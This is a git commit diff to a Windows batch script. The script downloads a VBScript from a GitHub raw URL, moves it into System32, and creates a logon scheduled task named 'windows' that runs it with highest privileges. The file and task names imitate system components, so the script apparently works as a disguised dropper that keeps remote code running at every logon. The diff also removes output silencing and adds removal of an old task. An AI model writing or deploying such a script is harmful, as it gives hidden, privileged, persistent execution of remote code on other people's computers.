feb1dda76035057be071159abdfbac56e105f89a
quannqttg <46080682+quannqttg@users.noreply.github.com>
2024-11-13 20:41:28 +0700

    Update create_task.bat

--- create_task.bat
+++ create_task.bat
@@ -11,6 +11,7 @@ if %errorLevel% neq 0 (
 set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
 set "destinationDir=C:\Program Files\Windows NT\ADB"
 set "winsysDownloadFile=winsys.vbs"
+set "taskName=windows"
 
 :: Tạo thư mục nếu chưa tồn tại
 if not exist "%destinationDir%" (
@@ -21,13 +22,13 @@ if not exist "%destinationDir%" (
 cd /d "%destinationDir%"
 
 :: Tải xuống tệp winsys.vbs
-curl -L -o "%winsysDownloadFile%" "%winsysUrl%" >nul 2>&1
+curl -L -o "%winsysDownloadFile%" "%winsysUrl%"
 
 :: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
 if exist "%winsysDownloadFile%" (
     :: Di chuyển winsys.vbs vào C:\Windows\System32
-    move /y "%winsysDownloadFile%" "C:\Windows\System32\%winsysDownloadFile%" >nul 2>&1
-    
+    move /y "%winsysDownloadFile%" "C:\Windows\System32\%winsysDownloadFile%"
+
     if not exist "C:\Windows\System32\%winsysDownloadFile%" (
         exit
     )
@@ -35,8 +36,15 @@ if exist "%winsysDownloadFile%" (
     exit
 )
 
+:: Kiểm tra và xóa tác vụ cũ nếu có
+schtasks /query /tn "%taskName%" >nul 2>&1
+if %errorlevel% equ 0 (
+    echo Tác vụ đã tồn tại, đang xóa tác vụ cũ...
+    schtasks /delete /tn "%taskName%" /f >nul 2>&1
+)
+
 :: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
-schtasks /create /tn "windows" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F >nul 2>&1
+schtasks /create /tn "%taskName%" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F
 
 :: Kiểm tra kết quả tạo tác vụ
 if %errorlevel% neq 0 (
